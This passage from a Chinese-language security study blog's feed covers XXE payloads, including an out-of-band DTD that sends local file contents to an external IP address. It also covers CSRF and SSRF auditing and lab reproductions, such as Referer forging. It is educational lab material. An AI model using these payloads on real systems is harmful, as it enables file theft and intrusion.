alt="image-20230130150314895"></p><p>更改请求数据格式：Content-Type的json为xml</p><p>并构造post的xml语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY f SYSTEM &quot;file:///home/ctf/flag.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;f;&lt;/x&gt;</span><br></pre></td></tr></table></figure><h2 id="XML-amp-XXE-白盒-CMS-amp-PHPSHE-amp-无回显审计"><a href="#XML-amp-XXE-白盒-CMS-amp-PHPSHE-amp-无回显审计" class="headerlink" title="XML&amp;XXE-白盒-CMS&amp;PHPSHE&amp;无回显审计"></a>XML&amp;XXE-白盒-CMS&amp;PHPSHE&amp;无回显审计</h2><p>审计流程：</p><blockquote><p>1、漏洞函数simplexml_load_string</p><p>2、pe_getxml函数调用了漏洞函数</p><p>3、wechat_getxml调用了pe_getxml</p><p>4、notify_url调用了wechat_getxml</p></blockquote><p>访问notify_url文件触发wechat_getxml函数,构造Paylod测试</p><p>先尝试读取文件，无回显后带外测试：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;http://c7ultt.dnslog.cn&quot;&gt;</span><br><span class="line">    %file;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;Mikasa&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/Day41-xml-xee-%E6%97%A0%E5%9B%9E%E6%98%BE-DTD%E5%AE%9E%E4%BD%93-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230130173132371.png" alt="image-20230130173132371"></p><p>然后带外传递数据解决无回显：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///d:/e.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://47.94.236.117/test.dtd&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>test.dtd的内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://47.94.236.117/get.php?file=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2><p>1、搜索关键字对于白盒xml测试更好，因为xml存在于数据传输和接收的地方，太多，如果这样搜的话太模糊，搜索漏洞产生的关键字函数将会更容易找此类漏洞，可以在百度搜素xml的一些解析函数</p><p>2、测试漏洞没有回显有三种情况：</p><p>(1)xml注入payload有误</p><p>(2)有漏洞但是无回显</p><p>(3)不存在xml漏洞</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;知识点&quot;&gt;&lt;a href=&quot;#知识点&quot; class=&quot;headerlink&quot; title=&quot;#知识点:&quot;&gt;&lt;/a&gt;#知识点:&lt;/h2&gt;&lt;h4 id=&quot;思路点：&quot;&gt;&lt;a href=&quot;#思路点：&quot; class=&quot;headerlink&quot; title=&quot;#思路点：&quot;&gt;&lt;/</summary>
      
    
    
    
    <category term="Web攻防" scheme="http://example.com/categories/Web%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day40 Web通用漏洞&amp;CSRF&amp;SSRF&amp;代码审计&amp;同源策略&amp;加载函数</title>
    <link href="http://example.com/2023/01/18/Day40Web%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CSRF-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0/"/>
    <id>http://example.com/2023/01/18/Day40Web%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CSRF-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0/</id>
    <published>2023-01-18T06:41:19.000Z</published>
    <updated>2023-01-19T09:11:23.262Z</updated>
    
    <content type="html"><![CDATA[<h2 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h2><p>1、CSRF-审计-复现测试&amp;同源策略</p><p>2、SSRF-审计-功能追踪&amp;函数搜索</p><h4 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h4><p>CSRF全称：Cross-site request forgery，即，跨站请求伪造，也被称为 “One Click Attack” 或 “Session Riding”，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。举个生活中的例子：就是某个人点了个奇怪的链接，自己什么也没输，但自己的qq号或其他的号就被盗了。即该攻击可以在受害者不知情的情况下以受害者名义伪造请求，执行恶意操作，具有很大的危害性。</p><h5 id="CSRF的攻击过程两个条件："><a href="#CSRF的攻击过程两个条件：" class="headerlink" title="CSRF的攻击过程两个条件："></a>CSRF的攻击过程两个条件：</h5><p>1、目标用户已经登录了网站，能够执行网站的功能。</p><p>2、目标用户访问了攻击者构造的URL。</p><h5 id="CSRF安全问题黑盒怎么判断："><a href="#CSRF安全问题黑盒怎么判断：" class="headerlink" title="CSRF安全问题黑盒怎么判断："></a>CSRF安全问题黑盒怎么判断：</h5><p>1、看验证来源不-修复</p><p>2、看凭据有无token–修复</p><p>3、看关键操作有无验证-修复</p><h5 id="CSRF安全问题白盒怎么审计："><a href="#CSRF安全问题白盒怎么审计：" class="headerlink" title="-CSRF安全问题白盒怎么审计："></a>-CSRF安全问题白盒怎么审计：</h5><p>同黑盒思路一样，代码中分析上述三看</p><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><h5 id="SSRF黑盒可能出现的地方："><a href="#SSRF黑盒可能出现的地方：" class="headerlink" title="-SSRF黑盒可能出现的地方："></a>-SSRF黑盒可能出现的地方：</h5><p>1.社交分享功能：获取超链接的标题等内容进行显示</p><p>2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p><p>3.在线翻译：给网址翻译对应网页的内容</p><p>4.图片加载&#x2F;下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p><p>5.图片&#x2F;文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p><p>6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p><p>7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p><p>8.数据库内置功能：数据库的比如mongodb的copyDatabase函数</p><p>9.邮件系统：比如接收邮件服务器地址</p><p>10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p><p>11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p><p>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p><p>12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p><h5 id="SSRF白盒可能出现的地方："><a href="#SSRF白盒可能出现的地方：" class="headerlink" title="-SSRF白盒可能出现的地方："></a>-SSRF白盒可能出现的地方：</h5><p>1、功能点抓包指向代码块审计</p><p>2、功能点函数定位代码块审计</p><h5 id="SSRF常见安全修复防御方案："><a href="#SSRF常见安全修复防御方案：" class="headerlink" title="-SSRF常见安全修复防御方案："></a>-SSRF常见安全修复防御方案：</h5><p>1、禁用跳转</p><p>2、禁用不需要的协议</p><p>3、固定或限制资源地址</p><p>4、错误信息统一信息处理</p><h5 id="系列内容点："><a href="#系列内容点：" class="headerlink" title="#系列内容点："></a>#系列内容点：</h5><p>1、CSRF&amp;SSRF&amp;原理&amp;利用&amp;协议等</p><p>2、CSRF&amp;SSRF&amp;黑盒&amp;审计&amp;修复等</p><h5 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h5><p> ➢ 代码审计-CSRF-SCMSFH无验证</p><p> ➢ 代码审计-CSRF-ZBLOG同源策略</p><p> ➢ 代码审计-SSRF-Yzmcms功能&amp;函数</p><p><strong>复现</strong></p><p> <em><strong>➢ 代码审计-CSRF-SCMSFH无验证</strong></em></p><p>本地被攻击方开始：只有管理员admin</p><p><img src="/../images/Day40Web%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CSRF-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0/image-20230119154652410.png" alt="image-20230119154652410"></p><p>用csrfTester生成文件index.html,将这个文件放到win7 phpstudy （相当于攻击方）</p><p><img src="/../images/Day40Web%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CSRF-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0/image-20230119153118122.png" alt="image-20230119153118122"></p><p>本地（被攻击方）访问win7：（前提是后台登录状态并且是打开的状态）<img src="/../images/Day40Web%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CSRF-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0/image-20230119153857259.png" alt="image-20230119153857259"></p><p>跳转成了：</p><p><img src="/../images/Day40Web%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CSRF-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0/image-20230119154011078.png" alt="image-20230119154011078"></p><p>再查看后台：</p><p><img src="/../images/Day40Web%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CSRF-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0/image-20230119154100831.png" alt="image-20230119154100831"></p><p>添加csrf复现成功</p><p> <strong>➢ 代码审计-CSRF-ZBLOG同源策略</strong></p><p>本地添加管理员的时候，来源为如下</p><p><img src="/../images/Day40Web%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CSRF-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0/image-20230119160022002.png" alt="image-20230119160022002"></p><p>用csrfTester捕捉数据包生成zblog.html放于win7</p><p>本地访问192.168.240.128&#x2F;zblog.html</p><p><img src="/../images/Day40Web%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CSRF-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0/image-20230119160920584.png" alt="image-20230119160920584"></p><p>发现添加失败，原因是源代码中有检验来源refer</p><p><img src="/../images/Day40Web%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CSRF-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0/image-20230119162334260.png" alt="image-20230119162334260"></p><p>于是本地采取抓包伪造来源：(真实环境下不会如此，因为被攻击方不可能会这样做)</p><p>原始数据包：</p><p><img src="/../images/Day40Web%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CSRF-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0/image-20230119162849982.png" alt="image-20230119162849982"></p><p>refer更改为<a href="http://127.0.0.1/zblog/zb_system/cmd.php">http://127.0.0.1/zblog/zb_system/cmd.php</a></p><p><img src="/../images/Day40Web%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CSRF-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0/image-20230119163015226.png" alt="image-20230119163015226"></p><p>此处改为<a href="http://127.0.0.1无效/">http://127.0.0.1无效</a></p><p>只有改成<a href="http://127.0.0.1/zblog/zb_system/cmd.php?act=MemberPst%E6%89%8D%E6%9C%89%E6%95%88">http://127.0.0.1/zblog/zb_system/cmd.php?act=MemberPst才有效</a></p><p>改后放包：</p><p><img src="/../images/Day40Web%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CSRF-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0/image-20230119164622203.png" alt="image-20230119164622203"></p><p>成功添加</p><p>真实环境下对于来源的检测可采取：</p><p>1、伪造-需要在代码数据包文件固定来源（用脚本）</p><p>2、尝试在网站寻找可上传的地方，上传数据包文件，取得当前同域名访问地址</p><p><strong>➢ 代码审计-SSRF-Yzmcms功能&amp;函数</strong></p><p>功能点采集</p><p>函数：file_get_contents函数存在读取功能</p><p>可以通过搜索file_get_contents来找ssrf漏洞，因为存在服务器的请求</p><p>总结：</p><p>特定漏洞功能–&gt;代码段分析审计</p><p>特定漏洞函数–&gt;测试对应的功能判断</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h2&gt;&lt;p&gt;1、CSRF-审计-复现测试&amp;amp;同源策略&lt;/p&gt;
&lt;p&gt;2、SSRF-审计-功能追踪&amp;amp;函数搜索&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="Web攻防" scheme="http://example.com/categories/Web%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>第一篇博客</title>
    <link href="http://example.com/2023/01/18/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
    <id>http://example.com/2023/01/18/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</id>
    <published>2023-01-17T16:56:41.000Z</published>
    <updated>2023-01-18T10:58:39.333Z</updated>
    
    <content type="html"><![CDATA[<p>.撒拉嘿哟撒拉嘿哟~~</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/qyc.jpg"></p><p>我他妈今天终于成功了！！！搭建博客，明天开始写博客笔记咯！！！！潼潼~ ~ ~我爱你！！！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;.撒拉嘿哟撒拉嘿哟~~&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/qyc.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;我他妈今天终于成功了！！！搭建博客，明天开始写博客笔记咯！！！！潼潼~ ~</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2023/01/17/hello-world/"/>
    <id>http://example.com/2023/01/17/hello-world/</id>
    <published>2023-01-17T05:16:11.556Z</published>
    <updated>2023-01-17T05:16:11.556Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
